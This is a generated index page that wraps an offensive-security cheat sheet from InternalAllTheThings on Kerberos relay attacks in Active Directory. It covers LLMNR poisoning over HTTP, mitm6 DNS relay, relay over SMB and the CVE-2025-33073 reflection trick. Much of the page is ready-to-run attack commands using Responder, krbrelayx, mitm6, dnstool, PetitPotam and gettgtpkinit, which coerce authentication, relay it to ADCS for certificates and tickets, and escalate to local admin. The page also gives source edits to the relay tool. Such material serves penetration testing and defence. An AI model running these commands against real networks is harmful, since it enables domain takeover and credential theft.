---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Internal - Kerberos Relay

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-internal-relay-kerberos` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-relay-kerberos.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Internal - Kerberos Relay](../../topics/active-directory/internal-kerberos-relay.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-internal-relay-kerberos |
| name | Internal - Kerberos Relay |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/internal-relay-kerberos.md |

## Preserved Source Material

````yaml
_body: "# Internal - Kerberos Relay\n\n## Kerberos Relay over HTTP\n\n**Requirements**:\n\n* Kerberos authentication for services\
  \ without signing\n\nHTTP through multicast poisoning (LLMNR)\n\n* An attacker sets up an LLMNR poisoner on the multicast\
  \ range.\n* An HTTP client on the multicast range fails to resolve a hostname. This can happen because of a typo in a browser,\
  \ a misconfiguration, but this can also be triggered by an attacker via WebDav coercion.\n* The LLMNR poisoner indicates\
  \ that the hostname resolves to the attacker’s machine. In the LLMNR response, the answer name differs from the query and\
  \ corresponds to an arbitrary relay target.\n* The victim performs a request on the attacker web server, which requires\
  \ Kerberos authentication.\n* The victim asks for a ST with the SPN of the relay target. It then sends the resulting AP-REQ\
  \ to the attacker web server.\n* The attacker extracts the AP-REQ and relays it to a service of the relay target.\n\n**Example**:\
  \ ESC8 with Kerberos Relay\n\n```ps1\npython3 Responder.py -I eth0 -N <PKI_SERVER_NETBIOS_NAME>\nsudo python3 krbrelayx.py\
  \ --target 'http://<PKI_SERVER>.<DOMAIN.LOCAL>/certsrv/' -ip <ATTACKER_IP> --adcs --template User -debug\n```\n\n## Kerberos\
  \ Relay over DNS\n\nAbuses the DNS Secure Dynamic Updates in Active Directory.\n\n* [dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)\n\
  * [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)\n* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)\n\
  \n**Steps**:\n\n* The client queries for the Start Of Authority (SOA) record for it’s name, which indicates which server\
  \ is authoritative for the domain the client is in.\n* The server responds with the DNS server that is authorative, in this\
  \ case the DC icorp-dc.internal.corp.\n* The client attempts a dynamic update on the A record with their name in the zone\
  \ internal.corp.\n* This dynamic update is refused by the server because no authentication is provided.\n* The client uses\
  \ a TKEY query to negotiate a secret key for authenticated queries.\n* The server answers with a TKEY Resource Record, which\
  \ completes the authentication.\n* The client sends the dynamic update again, but now accompanied by a TSIG record, which\
  \ is a signature using the key established in steps 5 and 6.\n* The server acknowledges the dynamic update. The new DNS\
  \ record is now in place.\n\n```ps1\n# Example - Relay to ADCS - ESC8\nsudo krbrelayx.py --target http://adscert.internal.corp/certsrv/\
  \ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine\nsudo mitm6 --domain internal.corp --host-allowlist\
  \ icorp-w10.internal.corp --relay adscert.internal.corp -v\npython gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut...lODSghScECP5hGFE3PXoz\
  \ internal.corp/icorp-w10$ icorp-w10.ccache\n```\n\n## Kerberos Relay over SMB\n\nAbuses the way SMB clients construct SPNs\
  \ when asking for a ST.\n\n* [cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay) - Framework for Kerberos relaying.\n\
  * [decoder-it/KrbRelayEx-RPC](https://github.com/decoder-it/KrbRelayEx-RPC) - Kerberos Relay and Forwarder for (Fake) RPC/DCOM\
  \ MiTM Server.\n\n```ps1\ndnstool.py -u \"DOMAIN.LOCAL\\\\user\" -p \"pass\" -r \"pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\"\
  \ -d \"10.10.10.10\" --action add \"10.10.10.11\" --tcp\npetitpotam.py -u 'user' -p 'pass' -d DOMAIN.LOCAL 'pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'\
  \ dc.domain.local\nkrbrelayx.py -t 'http://pki.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v\
  \ 'DC$'\ngettgtpkinit.py -cert-pfx 'DC$.pfx' 'DOMAIN.LOCAL/DC$' DC.ccache\n```\n\n## Kerberos Reflection - CVE-2025-33073\n\
  \nRelay one machine to itself by using the `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` trick. Also, grants local admin\
  \ privilege.\n\n![reflective-kerberos-relay-attack](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/ReflectiveKerberosRelayAttackBlog_hu_4f4898429389ef25.webp)\n\
  \n* Add a DNS record for `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` pointing to our IP address. It is\
  \ also possible to compromise any vulnerable machine by registering `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`.\n\
  \n    ```ps1\n    dnstool.py -u 'domain.local\\username' -p 'P@ssw0rd' 10.10.10.10 -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\
  \ -d 198.51.100.27\n    # OR\n    pretender -i \"vmnet2\" --spoof \"target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\"\
  \ --no-dhcp --no-timestamps\n    ```\n\n* Edit `krbrelayx/lib/servers/smbrelayserver.py` and remove these lines\n\n    ```ps1\n\
  \    156: blob['tokenOid'] = '1.3.6.1.5.5.2'\n    157: blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5\
  \ - Kerberos 5']),\n    158:                                                MechType(TypesMech['MS KRB5 - Microsoft Kerberos\
  \ 5']),\n    159:                                                MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support\
  \ Provider'])])\n    ```\n\n* Start the relay to catch the callback from TARGET.\n\n    ```ps1\n    krbrelayx.py -t TARGET.DOMAIN.LOCAL\
  \ -smb2support\n    krbrelayx.py --target smb://target.lab.redteam -c whoam\n    ```\n\n* Trigger a callback from the server\
  \ to `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` using PetitPotam.\n\n    ```ps1\n    nxc smb TARGET.domain.local\
  \ -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitpotam LISTENER=target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\n\
  \    # OR\n    petitpotam.py -d domain.local -u username -p 'password' \"TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\"\
  \ \"TARGET.DOMAIN.LOCAL\"\n    # OR\n    wspcoerce 'lab.redteam/user:password@target.lab.redteam' file:////target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path\n\
  \    ```\n\n## References\n\n* [A Look in the Mirror - The Reflective Kerberos Relay Attack - RedTeam Pentesting - June\
  \ 11, 2025](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/)\n* [Abusing multicast poisoning for\
  \ pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx - Quentin Roland - January 27, 2025](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)\n\
  * [From NTLM relay to Kerberos relay: Everything you need to know - Decoder - April 24, 2025](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)\n\
  * [NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073 - Wilfried Bécard and Guillaume\
  \ André - June 11, 2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)\n\
  * [Relaying Kerberos over DNS using krbrelayx and mitm6 - Dirk-jan Mollema - February 22, 2022](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)\n\
  * [Relaying Kerberos over SMB using krbrelayx - Hugo Vincent - November 20, 2024](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx)\n\
  * [Using Kerberos for Authentication Relay Attacks - James Forshaw - October 20, 2021](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)\n\
  * [Windows Exploitation Tricks: Relaying DCOM Authentication - James Forshaw - October 20, 2021](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)"
_relative_path: active-directory/internal-relay-kerberos.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-relay-kerberos.md
````
